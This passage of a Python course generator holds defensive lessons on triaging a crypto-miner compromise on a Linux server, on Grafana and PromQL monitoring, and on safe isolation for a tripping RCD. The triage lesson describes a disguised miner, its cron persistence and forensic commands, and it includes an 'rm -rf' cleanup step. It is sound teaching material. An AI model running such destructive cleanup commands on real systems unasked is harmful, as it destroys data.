SYMPTOM  ──►  CAUSE (what process / change?)  ──►  ENTRY (how did it get here?)
   top, metrics        ps, /proc, ss, lsof               logs, history, cron, units
```

Contain only after you know the cause *and* the persistence, or it comes back.

## Worked example
Alert: *CPU 97% on web-01*.

1. `top` (or `ps aux --sort=-%cpu | head`) shows PID 4242 `kworkerds` at 390% CPU.
   > Pause and predict: real kernel threads appear as `[kworker/...]` in brackets. What does a *non-bracketed* kworker imply?
2. `ls -l /proc/4242/exe` → `/tmp/.x/kworkerds`. Binaries do not belong in hidden folders under /tmp.
3. `ss -tnp` shows it connected to `192.0.2.77:3333`, a typical mining-pool port.
4. Entry point: `grep Accepted /var/log/auth.log` shows a password login for `deploy` from an IP that was brute-forcing seconds earlier.
5. Persistence: `ls /etc/cron.d/` reveals `sysupdate`, which relaunches the binary every 5 minutes.
6. Contain: capture evidence, then `kill 4242`, `rm /etc/cron.d/sysupdate`, `rm -rf /tmp/.x`, block the IP.

## The 20% you will use constantly
| Question | Command |
|---|---|
| What is hot? | `top`, `ps aux --sort=-%cpu` |
| What is it really? | `ls -l /proc/PID/exe`, `lsof -p PID` |
| Who is it talking to? | `ss -tnp` / `netstat -tnp` |
| How did they get in? | `grep -E 'Accepted|Failed' /var/log/auth.log`, `last` |
| How does it come back? | `/etc/cron.d/`, `crontab -l`, `systemctl list-unit-files` |

## How it breaks
- **Killed the miner, it is back 5 minutes later.** Cause: cron persistence left in place. Fix: remove the cron entry *and* the payload. (See serverfault: "Unknown process using 100% CPU keeps coming back".)
- **`crontab -l` shows nothing, so I assumed no cron.** Cause: system-wide jobs live in `/etc/cron.d/` and `/etc/crontab`, not the user crontab.
- **Rebooted to "fix" it.** Cause: you destroyed in-memory evidence and the persistence survives reboots anyway.

## Evidence before eradication
Every command you run changes the machine a little, and an attacker's process can delete itself when it notices you. A professional captures the minimum evidence *before* killing anything, in under two minutes:

```
ls -l /proc/4242/exe        # the real binary, even if renamed or deleted
cat /proc/4242/cmdline | tr '\0' ' '   # full command line (pool, wallet)
ls -l /proc/4242/cwd        # where it was started from
ss -tnp | grep 4242         # who it talks to
cp /tmp/.x/kworkerds /root/evidence/   # keep a copy (hash it with sha256sum)
```

Write down timestamps as you go: the incident report and any later forensics depend on them. In a regulated company, a suspected compromise usually triggers a formal incident process (security team, legal, sometimes regulators), so escalate early rather than quietly "fixing" it.

## Scoping: is it just this host?
The same credentials or the same weakness often exist elsewhere. Check the sibling servers for the same cron entry, the same login from the same IP, and the same outbound connection. In this scenario `web-02` shares the `deploy` user, so its `auth.log` deserves a look too. Rotate any credential the attacker may have seen, not only the one they used.

## Don't confuse it with
A **legit kernel worker** (`[kworker/3:2]`) has no executable on disk and runs as a kernel thread. A **disguised process** has a real path in `/proc/PID/exe`.

## Cheat sheet
- Triage: `top` → `/proc/PID/exe` → `ss -tnp` → logs
- Contain: evidence → kill → remove persistence + payload → block → rotate credentials
- After a root compromise: rebuild from a clean image
"""

M2_LESSON = """## Why this matters
Without metrics you find out about outages from customers. With the right queries and one good alert, you find out first.

## The mental model
```
app /metrics ──scrape──► Prometheus (stores time series) ◄──PromQL── Grafana (panels, alerts)
```
Grafana stores no metrics. It asks a **data source** with a **query** and draws the answer.

## Worked example
1. *Connections → Data sources → Prometheus*, URL `http://prometheus:9090`.
   > Pause and predict: why would `http://localhost:9090` fail when Grafana runs in a container?
2. *Explore*: `http_requests_total` is a **counter** (it only goes up). `rate(http_requests_total[5m])` gives requests/second; `sum(...)` adds the series up.
3. Error ratio: `sum(rate(http_requests_total{status=~"5.."}[5m])) / sum(rate(http_requests_total[5m]))`.
4. Latency p95: `histogram_quantile(0.95, sum by (le, route) (rate(http_request_duration_seconds_bucket[5m])))`.
5. *Alerting → New alert rule*: the error ratio, `IS ABOVE 0.05`, pending period `5m`.

## The 20% you will use constantly
| Need | PromQL |
|---|---|
| Is it up? | `up` |
| Throughput | `sum(rate(http_requests_total[5m]))` |
| Per label | `sum by (route) (rate(...[5m]))` |
| Error ratio | `errors / total` (both as rates) |
| Percentile | `histogram_quantile(0.95, sum by (le) (rate(..._bucket[5m])))` |
| CPU busy % | `100 - avg by (instance) (rate(node_cpu_seconds_total{mode="idle"}[5m])) * 100` |

## How it breaks
- **"connection refused" on the data source**: localhost inside a container is the container itself. Use the service name.
- **Graph only goes up**: you plotted a raw counter. Wrap it in `rate()`.
- **"expected type range vector"**: `rate()` needs a range like `[5m]`.
- **Alert flaps all night**: pending period of 0s. Use `for: 5m`.

## Reading a dashboard under pressure
Start from **user-facing symptoms** (error ratio, latency, saturation of the thing users touch), then drill down to causes (CPU, memory, a dependency). The four golden signals from Google's SRE practice give a reliable order: **latency, traffic, errors, saturation**. Put them top-left on the on-call dashboard, in that order, with the same time range and a clear unit on every panel.

Label discipline matters as much as the query: `status`, `route` and `instance` labels let you slice the same metric many ways, but an unbounded label (a user id, a full URL with query string) explodes the number of series and can take Prometheus down. Keep labels to values with a small, known set.

## Alerts people will not mute
An alert should mean *a human must act now*. Page on symptoms with a pending period (`for: 5m`), send causes to a ticket queue, and attach a runbook link in the annotations so the person woken at 3 a.m. knows the first three steps. Review every alert that fired after an incident: if nobody needed to act, delete it or raise its threshold.

## Don't confuse it with
`rate()` (per-second average over the window, for graphs and alerts) vs `increase()` (total growth over the window, for "how many in the last hour").

## Cheat sheet
- Counters: always `rate(x[5m])`, then aggregate
- Alerts: symptoms (errors, latency) + pending period + severity label
"""


def modules():
    q = lambda id, kind, prompt, options, correct, accept, explanation, skill: {
        "id": id, "kind": kind, "prompt": prompt, "options": options, "correct": correct,
        "accept": accept, "explanation": explanation, "skill_id": skill}
    m1 = {
        "id": "m1", "title": "Triage a compromised Linux server", "lesson": M1_LESSON,
        "key_points": [
            "Triage order: symptom → process → entry point → persistence",
            "/proc/PID/exe reveals the real binary behind any process name",
            "System cron jobs live in /etc/cron.d and /etc/crontab",
            "Contain only after you know the persistence, and capture evidence first",
            "After a root compromise, rebuild the host",
        ],
        "cards": [
            {"skill_id": "triage", "front": "Which file shows the real executable of PID 4242?", "back": "/proc/4242/exe (ls -l /proc/4242/exe)"},
            {"skill_id": "triage", "front": "Command to list TCP connections with owning processes?", "back": "ss -tnp (or netstat -tnp)"},
            {"skill_id": "log_analysis", "front": "Where does Ubuntu log SSH logins?", "back": "/var/log/auth.log"},
            {"skill_id": "log_analysis", "front": "How do you spot a brute force in auth.log?", "back": "Many 'Failed password' lines from one IP, often for many usernames"},
            {"skill_id": "containment", "front": "Why remove persistence before celebrating a kill?", "back": "Cron/systemd will relaunch the payload within minutes"},
            {"skill_id": "containment", "front": "Where do system-wide cron jobs live besides crontab -l?", "back": "/etc/cron.d/ and /etc/crontab"},
        ],
        "quiz": [
            q("m1q1", "single", "A process named `kworkerds` uses 390% CPU and runs from /tmp/.x. What is it most likely?",
              ["A kernel worker thread", "Malware disguised as a kernel worker", "A stuck log rotation", "Normal under load"], [1], [],
              "Kernel threads show in [brackets] and have no executable on disk.", "triage"),
            q("m1q2", "text", "Which file would you `ls -l` to see the executable behind PID 777?", [], [], [r"/proc/777/exe"],
              "/proc/<pid>/exe is a symlink to the real binary, even if it was renamed or deleted.", "triage"),
            q("m1q3", "multi", "Which of these are persistence mechanisms to check? (select all)",
              ["/etc/cron.d/", "systemd unit files", "/var/log/auth.log", "~/.bashrc"], [0, 1, 3], [],
              "auth.log is evidence, not persistence; the rest can relaunch code.", "containment"),
            q("m1q4", "single", "You killed the miner and it came back 5 minutes later. Why?",
              ["The kernel restarts killed processes", "A cron job relaunches it", "kill only pauses processes", "The load balancer restarted it"], [1], [],
              "A */5 cron entry relaunches it. Remove it and the payload.", "containment"),
            q("m1q5", "single", "What should happen to a host after a confirmed root compromise?",
              ["Reboot it", "Delete the malware and move on", "Rebuild it from a clean image", "Change its hostname"], [2], [],
              "With root, the attacker could have hidden anything; only a rebuild restores trust.", "containment"),
        ],
    }
    m2 = {
        "id": "m2", "title": "Monitoring with Grafana and PromQL", "lesson": M2_LESSON,
        "key_points": [
            "Grafana queries data sources; it stores no metrics",
            "Counters need rate(x[5m]) before they mean anything",
            "Error ratio = rate of 5xx ÷ rate of all requests",
            "histogram_quantile over _bucket rates gives percentiles",
            "Alerts: symptoms + pending period",
        ],
        "cards": [
            {"skill_id": "promql", "front": "Turn the counter http_requests_total into requests per second", "back": "rate(http_requests_total[5m]) (sum(...) to aggregate)"},
            {"skill_id": "promql", "front": "PromQL for p95 latency from a histogram", "back": "histogram_quantile(0.95, sum by (le) (rate(x_bucket[5m])))"},
            {"skill_id": "dashboards", "front": "Why does http://localhost:9090 fail as a data source in containers?", "back": "localhost is the Grafana container itself; use the service name"},
            {"skill_id": "alerting", "front": "What does an alert's pending period (for) prevent?", "back": "Paging on brief spikes; it must stay true for the whole period"},
            {"skill_id": "triage", "front": "First command when a host's CPU alert fires?", "back": "top / ps aux --sort=-%cpu"},
            {"skill_id": "dashboards", "front": "The four golden signals, in order?", "back": "Latency, traffic, errors, saturation"},
        ],
        "quiz": [
            q("m2q1", "single", "Your panel of http_requests_total only ever goes up. Fix?",
              ["Use increase() with no range", "Wrap it in rate(...[5m])", "Switch to a bar chart", "Set min to 0"], [1], [],
              "Counters are cumulative; rate() gives per-second change.", "promql"),
            q("m2q2", "text", "Write the PromQL function that turns histogram buckets into a percentile.", [], [], [r"histogram_quantile"],
              "histogram_quantile(φ, sum by (le) (rate(..._bucket[5m])))", "promql"),
            q("m2q3", "single", "Best alert for an online shop's checkout?",
              ["CPU > 80% for 0s", "5xx ratio > 5% for 5m", "Any error log line", "Disk > 50%"], [1], [],
              "Alert on symptoms users feel, sustained over a pending period.", "alerting"),
            q("m2q4", "single", "Error: 'expected type range vector in call to function rate'. Why?",
              ["Wrong metric name", "Missing [5m] range", "Grafana is offline", "Label typo"], [1], [],
              "rate() needs a range vector like metric[5m].", "promql"),
            q("m2q5", "single", "(Mixed) Which command reveals who a suspicious process is talking to?",
              ["ss -tnp", "df -h", "uptime", "free -m"], [0], [], "ss -tnp shows TCP sockets with PIDs.", "triage"),
        ],
    }
    return [m1, m2]


# ---------- course 2: a trade (electrical) with a workbench simulation ----------

def btn(label, message="", flags=(), node_status=(), clear=(), requires=(), blocked=""):
    return {"label": label, "message": message, "effects": effects(flags, node_status, message="", clear=clear),
            "requires": list(requires), "blocked_message": blocked}


def reading(tool, value, requires=(), flags=(), node_status=()):
    return {"tool": tool, "requires": list(requires), "value": value, "effects": effects(flags, node_status)}


def item(id, label, kind, status, detail, x, y, readings=(), actions=()):
    return {"id": id, "label": label, "kind": kind, "status": status, "detail": detail, "x": x, "y": y,
            "readings": list(readings), "actions": list(actions)}


VT = "Two-pole voltage tester"
PU = "Proving unit"
IR = "Insulation resistance tester (500 V)"


def appliance(id, label, ir_value, ok, x):
    acts = [
        btn("Unplug", f"{label} unplugged.", flags=[f"unplugged:{id}"], clear=[f"plugged:{id}"]),
    ]
    if ok:
        acts.append(btn("Plug back in and switch on", f"{label} on. RCD 2 holds.", flags=[f"plugged:{id}", f"{id}_ok"],
                        clear=[f"unplugged:{id}"], requires=["rcd_reset"],
                        blocked="Nothing happens: the kitchen sockets are dead while RCD 2 is off."))
    else:
        acts.append(btn("Plug back in and switch on", "", flags=["kettle_trips"], clear=["rcd_reset", "unplugged:kettle"],
                        node_status=[("rcd2", "off"), ("kitchen", "down")], requires=["rcd_reset"],
                        blocked="Nothing happens: the kitchen sockets are dead while RCD 2 is off."))
        acts[-1]["message"] = "Click, then BANG: RCD 2 trips the instant the kettle element heats. Kitchen dead again."
        acts.append(btn("Label DO NOT USE and withdraw from service", "Kettle bagged and labelled 'DO NOT USE: failed insulation test 0.18 MΩ'. Customer informed.",
                        flags=["kettle_withdrawn"], node_status=[("kettle", "off")], requires=["unplugged:kettle", "kettle_tested"],
                        blocked="Test before you condemn: unplug it and confirm the fault with an insulation resistance test first."))
    return item(id, label, "appliance (Class I)", "unknown", "Metal-bodied, earthed appliance on the kitchen ring.", x, 82,
                readings=[
                    reading(IR, ir_value, requires=[f"unplugged:{id}"], flags=[f"{id}_tested"] if ok else ["kettle_tested"],
                            node_status=[(id, "ok" if ok else "fault")]),
                    reading(IR, "Unplug the appliance before an insulation resistance test: never test equipment connected to the supply."),
                    reading("Look", "Lead, plug and casing look intact." if ok else "Limescale around the element plate and a dried water stain under the base."),
                ], actions=acts)


def electrical_sim():
    bench = {
        "type": "workbench", "id": "bench", "title": "Consumer unit and kitchen ring",
        "text": "Pick an instrument, then click a component to measure it, or use its action buttons. Readings change as you work.",
        "tools": [VT, PU, IR],
        "items": [
            item("main", "Main switch 100 A", "isolator", "on", "Double-pole main switch for the whole installation.", 10, 18,
                 readings=[reading("Look", "ON. Isolating here would kill the whole house, including the customer's freezer and alarm: isolate the smallest part that makes you safe.")]),
            item("rcd2", "RCD 2 · 30 mA Type A", "rcd", "off", "Protects the kitchen ring (MCB 2) and the cooker circuit (MCB 3).", 32, 18,
                 readings=[reading("Look", "Lever DOWN: tripped. Test button intact, no scorching.", requires=[]),
                           reading(VT, "Measure at the outgoing circuit, not inside the consumer unit: that needs a qualified electrician and the cover off.")],
                 actions=[btn("Reset RCD 2", "RCD 2 holds. Kitchen sockets are live again.", flags=["rcd_reset"],
                              node_status=[("rcd2", "on"), ("kitchen", "healthy")],
                              requires=["unplugged:kettle", "unplugged:toaster", "unplugged:fridge"],
                              blocked="You push the lever up and it snaps straight back down: something connected is still leaking current to earth. Unplug every appliance on these circuits, then reset. Repeated resets into a fault wear the RCD's contacts.")]),
            item("mcb2", "MCB 2 · B32 kitchen ring", "mcb", "on", "Overcurrent protection for the kitchen socket ring (2.5 mm² T&E).", 54, 18,
                 readings=[reading("Look", "Lever UP (on). An MCB trips on overcurrent, not on earth leakage.")],
                 actions=[btn("Switch OFF, lock off and tag", "MCB 2 locked off with your lock-off device and personal padlock; 'DANGER: men at work' tag fitted; key in your pocket.",
                              flags=["ring_isolated", "ring_locked"], node_status=[("mcb2", "off")]),
                          btn("Remove lock and switch ON", "Lock removed, MCB 2 back on.", clear=["ring_isolated", "ring_locked", "proved_dead"],
                              node_status=[("mcb2", "on")], requires=["ring_locked"], blocked="It is not locked off.")]),
            item("tester", "Two-pole tester (GS38)", "test instrument", "unknown", "Shrouded probes, fused leads. Prove it before AND after testing.", 80, 18,
                 readings=[reading(PU, "Tester lights at 230 V on the proving unit: the tester is working.", flags=["tester_proved"]),
                           reading("Look", "GS38 probes (≤4 mm exposed tip), leads undamaged. A tester is only trustworthy once proved on a known source.")]),
            item("socket", "Double socket (worktop)", "socket outlet", "unknown", "13 A twin socket on the kitchen ring, above the worktop.", 54, 50,
                 readings=[
                     reading(VT, "L–N 0 V · L–E 0 V · N–E 0 V. Circuit proved dead. (Re-prove your tester on the proving unit to complete prove–test–prove.)",
                             requires=["ring_isolated", "tester_proved"], flags=["proved_dead"]),
                     reading(VT, "0 V on all three, but your tester has not been proved on a known source. A tester with a dead battery reads exactly like this.",
                             requires=["ring_isolated"]),
                     reading(VT, "L–N 231 V · L–E 230 V · N–E 1 V: LIVE.", requires=["rcd_reset"]),
                     reading(VT, "0 V, but only because the RCD is off. Anyone could reset it while you work: that is not isolation."),
                     reading("Look", "Faceplate secure, no scorching, no smell of burning."),
                 ],
                 actions=[btn("Remove faceplate and inspect terminals", "Terminals tight, conductors undamaged, CPC connected. The socket is not the fault.",
                              flags=["faceplate_off"], requires=["ring_locked", "proved_dead"],
                              blocked="STOP. Safe isolation is not complete (isolate, lock off, prove the tester, test dead L–N, L–E, N–E). Opening an accessory on an unproven circuit is how people are electrocuted: someone could reset the RCD while your fingers are on the terminals.")]),
            appliance("kettle", "Kettle", "L+N to earth at 500 V DC: 0.18 MΩ. FAIL: below the 1 MΩ minimum for a Class I appliance.", False, 28),
            appliance("toaster", "Toaster", "L+N to earth at 500 V DC: >299 MΩ. PASS.", True, 54),
            appliance("fridge", "Fridge-freezer", "L+N to earth at 500 V DC: 48 MΩ. PASS.", True, 80),
        ],
        "links": [
            {"from": "main", "to": "rcd2", "label": "busbar"},
            {"from": "rcd2", "to": "mcb2", "label": ""},
            {"from": "mcb2", "to": "socket", "label": "ring final"},
            {"from": "socket", "to": "kettle", "label": "plug"},
            {"from": "socket", "to": "toaster", "label": "plug"},
            {"from": "socket", "to": "fridge", "label": "plug"},
        ],
    }
    return {
        "id": "rcd-kitchen",
        "title": "Kitchen sockets dead: find the fault, safely",
        "kind": "workbench",
        "tool": "Consumer unit, two-pole tester, insulation resistance tester",
        "minutes": 25,
        "skill_ids": ["safe_isolation", "rcd_principles", "fault_finding", "insulation_testing"],
        "briefing": (
            "**Call-out, 07:52.** *“Half the kitchen went off when I made breakfast. I reset the switch twice and it keeps going off.”*\n\n"
            "You are attending as an electrician's mate in a UK house (230 V, BS 7671). The consumer unit has a main switch, "
            "two 30 mA RCDs and MCBs.\n\n"
            "1. Work out **what** tripped and what kind of fault that means.\n"
            "2. Find the cause **by test, not by guess**, and restore power.\n"
            "3. Before opening anything, complete **safe isolation**. The simulation will stop you if you skip a step, "
            "just as a good supervisor would.\n\n"
            "Use the workbench in the *Apps* tab: choose an instrument, then click a component."
        ),
        "world": {
            "nodes": [
                node("supply", "Supply 230 V", "cloud", "healthy", "DNO supply, TN-C-S", 6, 50),
                node("cu", "Consumer unit", "service", "degraded", "Main switch, RCD 1, RCD 2 (tripped)", 34, 50),
                node("kitchen", "Kitchen ring", "client", "down", "Sockets dead", 64, 30),
                node("cooker", "Cooker circuit", "client", "down", "Also on RCD 2", 64, 72),
                node("customer", "Customer", "person", "unknown", "Needs the fridge back on", 92, 50),
            ],
            "links": [
                {"from": "supply", "to": "cu", "label": "tails"},
                {"from": "cu", "to": "kitchen", "label": "MCB 2"},
                {"from": "cu", "to": "cooker", "label": "MCB 3"},
            ],
        },
        "hosts": [],
        "logs": [],
        "apps": [{"id": "bench", "name": "Electrical workbench (simulated)", "node_id": "cu", "accent": "#f59e0b",
                  "screens": [{"id": "cu", "title": "Consumer unit · kitchen", "widgets": [bench]}]}],
        "objectives": [
            objective("e1", "Read the consumer unit", "answer", question="What tripped, and what does that tell you?",
                      options=["An MCB: an overload or short circuit", "The RCD: current is leaking to earth somewhere it protects",
                               "The main switch: a supply fault", "Nothing: it is a power cut"], correct=[1],
                      explanation="RCD 2's lever is down while the MCBs are up. An RCD trips when line and neutral currents differ (≥30 mA here), meaning current is returning through earth, or through a person."),
            objective("e2", "Restore power without the faulty load", "state", flags=["rcd_reset"],
                      explanation="Unplug everything on the RCD's circuits, then reset. If it holds, the fault is in something that was plugged in, not the fixed wiring."),
            objective("e3", "Prove which appliance is faulty by test", "state", flags=["kettle_tested"],
                      explanation="Plugging back one at a time points to a suspect; an insulation resistance test at 500 V DC (L+N to earth) proves it: 0.18 MΩ against a 1 MΩ minimum."),
            objective("e4", "Name the culprit", "answer", question="Which item caused the trips?",
                      options=["The worktop socket", "The kettle", "The toaster", "The fridge-freezer"], correct=[1],
                      explanation="The kettle: a water-damaged element leaks to its earthed body. Heat and moisture make such faults appear only in use."),
            objective("e5", "Inspect the socket under safe isolation", "state", flags=["ring_locked", "proved_dead", "faceplate_off"],
                      explanation="Isolate (MCB 2), lock off and tag, prove the tester on a proving unit, test dead L–N, L–E, N–E, re-prove, and only then remove the faceplate."),
            objective("e6", "Make the hazard safe for the customer", "state", flags=["kettle_withdrawn"],
                      explanation="Withdraw it from use and label it with the reason, then tell the customer why. Never leave a known-faulty appliance where it will be used again."),
        ],
        "hints": [
            "Look at the consumer unit first: which lever is down, an RCD or an MCB? They protect against different things.",
            "Unplug the kettle, toaster and fridge, reset RCD 2, then plug them back one at a time. Confirm the suspect with the insulation resistance tester.",
            "For the socket: MCB 2 → 'Switch OFF, lock off and tag'; Proving unit on the tester; Two-pole tester on the socket; then 'Remove faceplate'. Finish by withdrawing the kettle.",
        ],
        "debrief": (
            "### What happened\n"
            "The kettle's element sheath had cracked and taken in water. With the element hot, current leaked from line to the "
            "kettle's earthed metal body. The difference between line and neutral current exceeded RCD 2's 30 mA rating, so it "
            "disconnected in tens of milliseconds, which is exactly what it is for. The customer's two resets just kept re-energising the fault.\n\n"
            "### How a professional approaches it\n"
            "1. **Read the protective devices**: RCD (earth leakage) vs MCB (overcurrent) points to completely different causes.\n"
            "2. **Split the problem**: all loads off → reset. Holds? The fault is in a load. Trips with everything unplugged? The fault "
            "is in the fixed wiring: isolate circuits one by one and insulation-test the installation (qualified electrician work).\n"
            "3. **Prove it by test**: insulation resistance at 500 V DC; Class I appliances should exceed 1 MΩ (IET Code of Practice "
            "for in-service inspection and testing).\n"
            "4. **Safe isolation, every time**: isolate → lock off & tag → prove tester → test dead (L–N, L–E, N–E) → re-prove tester. "
            "HSE guidance GS38 covers the test equipment.\n\n"
            "### Elsewhere in the world\n"
            "North America uses **GFCI** devices (typically tripping at about 4–6 mA on 120 V receptacles) and NFPA 70E for safe work "
            "practices; IEC countries use RCDs under IEC 60364. The method is the same.\n\n"
            "### Know your limits\n"
            "Resetting devices, unplugging appliances and withdrawing faulty equipment are safe for anyone. Opening accessories, "
            "testing the fixed installation and repairs are work for a competent, qualified person. In the UK, much domestic "
            "work is notifiable under Part P of the Building Regulations."
        ),
    }


E1_LESSON = """## Why this matters
A tripping RCD is the most common electrical call-out in homes. It is also where untrained people get hurt: they reset it again and again, or open a socket "because the power is off". A professional finds the cause in minutes and never works on anything they have not proved dead.

## The mental model
An **RCD** (residual current device) compares the current going out on the line conductor with the current coming back on neutral. In a healthy circuit they are equal. If they differ by more than the device's rating (30 mA for socket circuits under BS 7671 / IEC 60364), the missing current is flowing somewhere else, through earth or through a person, and the RCD disconnects, typically within 40 ms at five times its rating.

```
 L ──►──[ RCD compares L and N ]──►── appliance ──┐
 N ──◄──[                       ]──◄──────────────┘
                 leakage ──► earth (or a person)   ⇒  I(L) ≠ I(N)  ⇒  trip
```

An **MCB** (miniature circuit breaker) protects the cable from *overcurrent*: too much load, or a short circuit. Different device, different cause.

## Worked example
Call-out: kitchen sockets dead; in the consumer unit, RCD 2 is down and every MCB is up.

1. RCD down, MCBs up → this is **earth leakage**, not overload.
   > Pause and predict: if you unplug everything and the RCD then resets and holds, where must the fault be?
2. Unplug every appliance on the circuits RCD 2 protects, then reset it. It holds, so the fault is in something that was plugged in, not in the fixed wiring.
3. Plug appliances back **one at a time**, switching each on. The kettle trips it the moment its element heats.
4. Confirm with an **insulation resistance test** at 500 V DC, line and neutral joined, to earth: 0.18 MΩ. A Class I appliance should read above 1 MΩ. Confirmed.
5. Withdraw the kettle from use, label it, and explain to the customer.

## The 20% you will use constantly
| Situation | What it means | First move |
|---|---|---|
| RCD down, MCBs up | Earth leakage on that RCD's circuits | Unplug all loads, reset, add back one by one |
| One MCB down | Overload or short on that circuit | Reduce load; if it trips instantly, suspect a short |
| RCD trips with everything unplugged | Fault in the fixed installation | Qualified electrician: isolate circuits, insulation-test |
| Trips only when wet or hot | Moisture or element fault | Test after use; check outdoor sockets and heaters |

**Safe isolation, always in this order:** identify the circuit → isolate → lock off with your own padlock and tag → prove the two-pole tester on a known source (proving unit) → test dead L–N, L–E, N–E → re-prove the tester → only then work.

## How it breaks
- **Resetting repeatedly "until it holds"**: you keep re-energising a fault, and RCD contacts wear. One reset with loads removed tells you more.
- **Testing with an unproved tester**: a flat battery shows 0 V on a live circuit. That is why prove–test–prove exists.
- **Using a non-contact "pen" to prove dead**: fine as an indicator, never as proof. Use a GS38-compliant two-pole tester.
- **Relying on the RCD being off as isolation**: anyone can reset it while you work. Lock off the circuit's own device.

## Don't confuse it with
**RCD vs MCB vs RCBO**: an RCD protects people from earth leakage, an MCB protects cables from overcurrent, and an **RCBO** does both for a single circuit (so one fault no longer takes out half the house). In North America the people-protection device at sockets is the **GFCI**, which trips at about 4–6 mA.

## Cheat sheet
- RCD trip = leakage to earth; MCB trip = too much current
- All loads off → reset → back one at a time → confirm with an insulation test
- Class I appliance insulation resistance: > 1 MΩ at 500 V DC
- Safe isolation: isolate · lock · prove · test (L–N, L–E, N–E) · re-prove
- Fixed-wiring faults and opening accessories: competent, qualified persons only
"""


def electrical_course():
    return {
        "format": 1,
        "slug": "demo-electrical-fault-finding",
        "title": "Electrical fault-finding: tripping RCDs (demo)",
        "topic": "Domestic electrical fault-finding",
        "goal": "Find why the power keeps tripping, safely, the way an electrician does",
        "level": 40,
        "level_label": "Beginner",
        "hours": 1.0,
        "summary": "A built-in sample from the trades: one lesson and one hands-on workbench simulation on a consumer unit, with real instruments, realistic readings and safe isolation enforced.",
        "target_performance": "Diagnose a tripping RCD to the faulty appliance by test, apply safe isolation before touching anything, and leave the installation safe.",
        "out_of_scope": ["Fixed-wiring repairs", "Consumer unit replacement", "Certification and Part P notification"],
        "skills": [
            {"id": "safe_isolation", "name": "Safe isolation", "why": "It is what keeps electricians alive", "weight": 10},
            {"id": "rcd_principles", "name": "RCD vs MCB principles", "why": "Points you at the right cause immediately", "weight": 8},
            {"id": "fault_finding", "name": "Systematic fault finding", "why": "Minutes instead of hours", "weight": 8},
            {"id": "insulation_testing", "name": "Insulation resistance testing", "why": "Proves faults instead of guessing", "weight": 7},
        ],
        "modules": [
            {"id": "e1", "title": "Safe isolation and RCD fault-finding", "minutes": 50,
             "summary": "Read the consumer unit, split the problem, prove the fault by test, and never touch what you have not proved dead.",
             "objectives": ["Tell an RCD trip from an MCB trip", "Find a leaking appliance by elimination and test", "Carry out safe isolation in the correct order"],
             "skill_ids": ["safe_isolation", "rcd_principles", "fault_finding", "insulation_testing"],
             "sims": [{"id": "rcd-kitchen", "title": "Kitchen sockets dead: find the fault, safely", "kind": "workbench",
                       "tool": "Consumer unit, two-pole tester, insulation resistance tester", "premise": "Kettle with a water-damaged element trips a 30 mA RCD"}]},
        ],
        "capstone": {"id": "", "title": "", "kind": "", "tool": "", "premise": ""},
        "research": {"stackexchange_site": "diy", "tags": ["electrical", "gfci"], "queries": ["rcd keeps tripping"]},
        "status": "ready",
        "status_detail": "",
        "created_unix": 0,
        "generator": "hand-written demo",
    }


def electrical_modules():
    q = lambda id, kind, prompt, options, correct, accept, explanation, skill: {
        "id": id, "kind": kind, "prompt": prompt, "options": options, "correct": correct,
        "accept": accept, "explanation": explanation, "skill_id": skill}
    return [{
        "id": "e1", "title": "Safe isolation and RCD fault-finding", "lesson": E1_LESSON,
        "key_points": [
            "An RCD trips on leakage to earth; an MCB trips on overcurrent",
            "Unplug all loads, reset once, then add loads back one at a time",
            "Prove a suspect with an insulation test: Class I appliances > 1 MΩ at 500 V DC",
            "Safe isolation: isolate, lock off, prove tester, test dead L–N/L–E/N–E, re-prove",
            "An RCD being off is not isolation",
        ],
        "cards": [
            {"skill_id": "rcd_principles", "front": "What does an RCD measure?", "back": "The difference between line and neutral current (residual current)"},
            {"skill_id": "rcd_principles", "front": "Typical RCD rating for socket circuits under BS 7671?", "back": "30 mA"},
            {"skill_id": "fault_finding", "front": "RCD trips even with every appliance unplugged. Where is the fault?", "back": "In the fixed installation: a job for a qualified electrician"},
            {"skill_id": "insulation_testing", "front": "Minimum insulation resistance for a Class I appliance at 500 V DC?", "back": "1 MΩ"},
            {"skill_id": "safe_isolation", "front": "The three test combinations when proving dead?", "back": "L–N, L–E, N–E"},
            {"skill_id": "safe_isolation", "front": "Why prove the tester before AND after testing dead?", "back": "A faulty tester (e.g. flat battery) shows 0 V on a live circuit"},
        ],
        "quiz": [
            q("e1q1", "single", "Kitchen sockets are dead. RCD 2 is down; all MCBs are up. What kind of fault is this?",
              ["Overload", "Earth leakage", "Supply failure", "Loose neutral at the main fuse"], [1], [],
              "An RCD trips on residual (leakage) current; an MCB trips on overcurrent.", "rcd_principles"),
            q("e1q2", "single", "Everything is unplugged and the RCD now resets and holds. Where is the fault most likely?",
              ["Fixed wiring", "An appliance that was plugged in", "The RCD itself", "The supply company's side"], [1], [],
              "Removing the loads removed the leakage, so the leak was in a load.", "fault_finding"),
            q("e1q3", "multi", "Which steps belong to safe isolation? (select all)",
              ["Lock off and tag the circuit's device", "Prove the tester on a known source", "Test dead L–N, L–E and N–E", "Confirm dead with a non-contact pen and start work"],
              [0, 1, 2], [], "A non-contact detector is an indicator only; proving dead needs a proved two-pole tester.", "safe_isolation"),
            q("e1q4", "text", "What residual current rating (in mA) is typical for RCDs protecting UK socket circuits?", [], [], [r"^\s*30\s*(ma|milliamps?)?\s*$"],
              "30 mA: low enough to protect people from electric shock.", "rcd_principles"),
            q("e1q5", "single", "A kettle reads 0.18 MΩ (L+N to earth, 500 V DC). What do you do?",
              ["Keep using it: it boils fine", "Retest at 250 V and keep it if it passes", "Withdraw it from use and label it", "Replace the RCD with a 100 mA one"], [2], [],
              "It fails the 1 MΩ minimum for Class I equipment. Never 'fix' a leakage fault by desensitising the protection.", "insulation_testing"),
            q("e1q6", "single", "Why is 'the RCD is off' not safe isolation?",
              ["It only disconnects line", "Anyone can reset it while you work", "RCDs never fully disconnect", "It is safe isolation"], [1], [],
              "Isolation must be secured: lock off the circuit's device with your own padlock and prove dead.", "safe_isolation"),
        ],
    }]


def write_course(dirname, course, modules, sims):
    out = os.path.join(OUT, dirname)
    os.makedirs(os.path.join(out, "sims"), exist_ok=True)
    os.makedirs(os.path.join(out, "modules"), exist_ok=True)
    for sim in sims:
        with open(os.path.join(out, "sims", sim["id"] + ".json"), "w") as f:
            json.dump(sim, f, indent=1, ensure_ascii=False)
    for m in modules:
        with open(os.path.join(out, "modules", m["id"] + ".json"), "w") as f:
            json.dump(m, f, indent=1, ensure_ascii=False)
    with open(os.path.join(out, "course.json"), "w") as f:
        json.dump(course, f, indent=1, ensure_ascii=False)


def main():
    write_course("incident-response", course(), modules(), [infected_sim(), grafana_sim()])
